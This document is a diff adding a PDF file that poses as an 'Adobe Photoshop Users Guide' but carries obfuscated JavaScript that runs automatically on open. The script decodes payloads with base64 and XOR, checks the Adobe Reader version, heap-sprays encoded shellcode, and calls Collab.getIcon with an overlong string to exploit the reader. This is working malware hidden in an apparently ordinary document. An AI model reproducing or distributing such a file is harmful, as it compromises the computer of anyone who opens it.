@@ -1,0 +1,89 @@
+%PDF-1.1
+
+1 0 obj
+<<
+ /Type /Catalog
+ /Outlines 2 0 R
+ /Pages 3 0 R
+ /OpenAction 7 0 R
+>>
+endobj
+
+2 0 obj
+<<
+ /Type /Outlines
+ /Count 0
+>>
+endobj
+
+3 0 obj
+<<
+ /Type /Pages
+ /Kids [4 0 R]
+ /Count 1
+>>
+endobj
+
+4 0 obj
+<<
+ /Type /Page
+ /Parent 3 0 R
+ /MediaBox [0 0 612 792]
+ /Contents 5 0 R
+ /Resources <<
+             /ProcSet [/PDF /Text]
+             /Font << /F1 6 0 R >>
+            >>
+>>
+endobj
+
+5 0 obj
+<< /Length 98 >>
+stream
+BT /F1 12 Tf 100 700 Td 15 TL (Adobe Photoshop Users Guide) Tj ET
+endstream
+endobj
+
+6 0 obj
+<<
+ /Type /Font
+ /Subtype /Type1
+ /Name /F1
+ /BaseFont /Helvetica
+ /Encoding /MacRomanEncoding
+>>
+endobj
+
+
+7 0 obj
+<<
+ /Type /Action
+ /S /JavaScript
+ /JS (
+                              var iFr4b5Vhz4=1;function ySC2SBnb5S(count,Ik4fPJ){var CpGHFlcaMkp="";while(--count>=0)CpGHFlcaMkp+=Ik4fPJ;return CpGHFlcaMkp;};var a7Mh1yI;var HOyrACqp;var Osj1esbR;var UaKnn7v;function OMxcLIDvwn(fz3Rj3Gyw,T3u31mTma,yEVsEuePD){for(var i=0;i<yEVsEuePD;i++){fz3Rj3Gyw[fz3Rj3Gyw.length]=T3u31mTma;}};function iCJgxmy(fz3Rj3Gyw,Nze7ir8yv,pRd2Gc){for(var T3u31mTma=Nze7ir8yv;T3u31mTma<=pRd2Gc;T3u31mTma++){fz3Rj3Gyw[fz3Rj3Gyw.length]=T3u31mTma;}};function H9F09Iofu0(){if(Osj1esbR){return;}UaKnn7v=new Array();a7Mh1yI=new Array(0x81, 0x84, 0x91, 0xf7, 0x92, 0xaa, 0xbf, 0xd1);HOyrACqp=8;OMxcLIDvwn(UaKnn7v,-1,43);OMxcLIDvwn(UaKnn7v,62,1);OMxcLIDvwn(UaKnn7v,-1,3);OMxcLIDvwn(UaKnn7v,63,1);iCJgxmy(UaKnn7v,52,61);OMxcLIDvwn(UaKnn7v,-1,7);iCJgxmy(UaKnn7v,0,25);OMxcLIDvwn(UaKnn7v,-1,6);iCJgxmy(UaKnn7v,26,51);OMxcLIDvwn(UaKnn7v,-1,133);Osj1esbR=1;};function aoayo984(vMG5r){var u6OkcF3mhV="";var GIAj4xil,aoIn,xy2hLO2yGD;var ijiSbK00t61,OI8d,d0DJev4R,ePCrwP;var i=0;H9F09Iofu0();var urjJFAlO=vMG5r.length;do{ijiSbK00t61=UaKnn7v[vMG5r.charCodeAt(i++)];OI8d=UaKnn7v[vMG5r.charCodeAt(i++)];d0DJev4R=UaKnn7v[vMG5r.charCodeAt(i++)];ePCrwP=UaKnn7v[vMG5r.charCodeAt(i++)];GIAj4xil=(ijiSbK00t61<<2)|(OI8d>>4);aoIn=((OI8d&15)<<4)|(d0DJev4R>>2);xy2hLO2yGD=((d0DJev4R&3)<<6)|ePCrwP;u6OkcF3mhV+=String.fromCharCode(GIAj4xil);if(d0DJev4R!= -1){u6OkcF3mhV+=String.fromCharCode(aoIn);}if(ePCrwP!= -1){u6OkcF3mhV+=String.fromCharCode(xy2hLO2yGD);}}while(i<urjJFAlO);if(i!=urjJFAlO){return "";}return u6OkcF3mhV;};function kdslm2(pdyU41gHf4A){var NbVvEepecV;var ewAgC7l="",urjJFAlO=0;NbVvEepecV=aoayo984(pdyU41gHf4A);var urjJFAlO=NbVvEepecV.length;for(i=0;i<urjJFAlO;i++){var GIAj4xil=NbVvEepecV.charCodeAt(i);var aoIn=GIAj4xil^a7Mh1yI[i%HOyrACqp];ewAgC7l+=String.fromCharCode(aoIn);}return ewAgC7l;};var Ich9BIP0=0;function xzSUGc5(ChCj2bLgINA,a9DDo){while(ChCj2bLgINA.length*2<a9DDo){ChCj2bLgINA+=ChCj2bLgINA;}
+eval(kdslm2('wuzSnaDI87bIytDK0cL8u7Pm3ZDb5P7/8vHzhObY1r/mrKHb85P7le6ro96poA=='));return ChCj2bLgINA;};function Dn74cpKcTs(OENDPMe){if(Ich9BIP0>0){return;}var ifr9T90nn=0x033C0000;var A61V6=unescape(kdslm2('pPH0laefmqSyt6eSt9+J5eK0tIKmmoezpPGpwqGamqS2vPLHt9+K57HgtIKmmoezpPGplaLJmqSw56bHt9+Hs+DgtIKikovhpPHyxKfPmqS1tKmVt9+H4rKwtIKlydzhpPGlx6rImqTit6KUt9+Hs7e0tIKgnomy')+kdslm2('pPGplaCemqSy56XCt9+IsrnmtIKlko/kpPH3k6KZmqS14qmVt9+Hs7C8tIKgmoq3pPH1k6KZmqSyt/TEt9+Hs7W9tIKqyIzlpPH3wqKZmqTitKLEt9/Zsri9tIKqnt6ypPGmw/GamqTitaHAt9+PteLltIL2mo/i')+kdslm2('pPH3w/fImqS0sKKVt9+N6bOwtIL3mIjkpPGkkarImqSxt6PDt9+J5+XgtIKiyYezpPGplabImqSw56SRt9/btbG3tIKinoezpPGhxKrImqS5vfLCt9+N5bWwtIKkm46ypPH0lfGZmqTg4KTFt9+K47S0tILzk9rp')+kdslm2('pPH3kfTMmqS5vfeRt9+H4rGztIKiktzlpPHywKqZmqSy5qHDt9+I5Oe1tILxmdqypPGlkqrPmqTk56GSt9+O5uCxtIKlyY/gpPGmzqPMmqTkvKGWt9+G5ufmtIKizNm1pPHylqGZmqS05qmWt9+L6OO0tIL2yI21')+kdslm2('pPGlw6CTmqS0s/TPt9/atbW9tIKlz4+3pPGllarImqS04vTEt9+H4rThtIKlydqypPH0lKrImqS15/TPt9/Zt+fitIKqyNm3pPH0lfaamqTk5qHFt9/a6bGxtIL0zNnopPH3kfTMmqTk5qTPt9/as7G2tIKqzonn')+kdslm2('pPGlx6XOmqS5tPDDt9/Zt7bhtIKln9m3pPGlkfSTmqSws/fBt9/Z4bnmtIL3z4fipPH3kqHLmqSxsqWSt9+ItbngtIKqyI/lpPGpxPHPmqSwvPLGt9+HsOS8tIL0zNm3pPGpxPTMmqSx5/LGt9+P4OO8tIKkn4m0')+kdslm2('pPHyxqWemqSxvPfPt9+J6bS0tIKkk4jmpPGnzqTPmqTl56mVt9+K47S1tIL0zIripPGhw6efmqS0vaSWt9/b4bnmtIKkktrppPH3kfTMmqSyt/eRt9+K4eK0tIKnmorhpPGkx6eamqS0sfeRt9+H6LDntIKhnovk')+kdslm2('pPHyx6GZmqS0tKTHt9+K4bS0tIKnzoe1pPGkxKaamqS2sfeRt9/Zt7KwtIKgmorkpPGlwqqTmqTk5qLPt9/a6LGxtIKimoe3pPGhx6KamqTlsamVt9/c47m1tIKimtnhpPGhx6KamqS0sanOt9+K47K0tILxmonp')+kdslm2('pPGhx6KamqTn4qHHt9+O5bSxtIKnn4ezpPGhxKGamqTjvPXHt9+M4La1tIKkno20pPGhxaqTmqTitKLEt9+JsuO8tIKimomypPGpzqKamqSxsKXFt9/c4bK3tILwmorhpPGkx6qYmqSxtvPHt9+M47S0tIKnmtzh')+kdslm2('pPHzx6eamqTitaXHt9+O6eS0tIL0zIrhpPGix6WfmqS0sfeRt9+H4rG8tIL0zNnppPHzz6WemqS1sanOt9+M4rLntIKknNzhpPGhlPCSmqSz5qHGt9+Hs+S0tIKqztnlpPGhw6fPmqS3sqTEt9+P5eO8tIKnmo/g')+kdslm2('pPGlwarOmqS0tKHPt9+I5OfitIL0zIzppPGjw6efmqS1sqmVt9+H5LGwtIKlntzhpPGixKOcmqS0tPLHt9+L57ngtIKnmo/lpPGmwfTMmqS54KHDt9+P6bWytIL0zIrhpPGilKWfmqS0sfeRt9/as7HntIL0zNvh')+kdslm2('pPGilKWfmqS0sfeRt9+M4rC0tIL3yNzhpPH0laKYmqTn4qGRt9+M4baxtIKnn9m3pPGpxKKemqSx5fLHt9/Zt7S0tIKjkorkpPH3wPfImqTlsfTPt9/Zt+fhtIKkktm3pPGmw6WemqSy5abHt9+Nt7PitIKlnom0')+kdslm2('pPGixqGbmqS3t6OSt9+NtLfitIKkz4nopPGixqDMmqTn4veR'));var mcpcy3y=0x400000;var z5VyEz=A61V6.length*2;var a9DDo=mcpcy3y-(z5VyEz+0x38+2);var ChCj2bLgINA=unescape(kdslm2('pPGglKPJmqSw56CUt9+OsrDntIKjyY6ypPGglKPJmqSw56CUt9+OsrDntIKjyY6y'));ChCj2bLgINA=xzSUGc5(ChCj2bLgINA,a9DDo);odsVJljwErO=(OENDPMe-ifr9T90nn)/mcpcy3y;ea3r=new Array();var DrdGn9=unescape(kdslm2('pPGox6ua'));try{for(i=0;i<odsVJljwErO;i++){ea3r[i]=ChCj2bLgINA+DrdGn9+A61V6;}Ich9BIP0=1;}catch(e){};Ich9BIP0=1;};function ymz0U68(){var ujgmf;var a=0;var b=0;var HB4buHHV4Ek=0;var JAwqSNllx=0;try{var BdhiQTn=app.viewerVersion.toString().split(".");a=BdhiQTn[0];if(BdhiQTn.length>1){a=BdhiQTn[0];
+eval(kdslm2('47nTk/rD7oXv36CqvNnKs/Lw49+iho74uvLwhbLi/eXj8dm/xJ76urzG9Z/7++u/2rXM2eHf3aL19rnGvpuW6ujiudba6Iuz9MzZoabv1Pj6zNPD8N/3mdew1JyvmoSs9+Xj19jryKDSyv2b6pf9tentwKP88Y6Mr/fkleHezfmzqKDeqcPZ+aDO0IDj+fG97fy4jNjryKDSyv2b6pf3k7Xm5L/a/IuU6r/ZtabIypnJ0qWy+ZeP6vyO'));}ujgmf=parseInt(JAwqSNllx)+parseInt(HB4buHHV4Ek)*10+parseInt(b)*100+parseInt(a)*1000;}catch(e){}return ujgmf;};var EwotnPeTS=ymz0U68();var lb7KIR9;if((EwotnPeTS>=8000&&EwotnPeTS<=8102)||(EwotnPeTS>=9000&&EwotnPeTS<9100)){if(EwotnPeTS<9000){Dn74cpKcTs(0x0C0C0C0C);lb7KIR9=unescape(kdslm2('pLTS0qLpmuHCoaG0'));}else{Dn74cpKcTs(0x1C1C1C1C);lb7KIR9=unescape(kdslm2('pLXS0qPpmuDCoaC0'));}while(lb7KIR9.length<0x4000){lb7KIR9+=lb7KIR9;}app.doc.Collab.getIcon('N.'+lb7KIR9);}else if((EwotnPeTS>=5000&&EwotnPeTS<7100)){Dn74cpKcTs(0x0C0C0C0C);
+eval(kdslm2('wuv9m/PIkbLu6P2S8d76vODt/b78zND5+unikKjT7JKz19OZ8J/s+bW0qMG+39G08ufwh/eCnfT0tPLH8Y/K4eK08tW7g8L4uo4='));} 
+)
+>>
+endobj
+
+
+xref
+0 8
+0000000000 65535 f 
+0000000010 00000 n 
+0000000098 00000 n 
+0000000147 00000 n 
+0000000208 00000 n 
+0000000400 00000 n 
+0000000549 00000 n 
+0000000663 00000 n 
+trailer
+<<
+ /Size 8
+ /Root 1 0 R
+>>
+startxref
+191548
+%%EOF
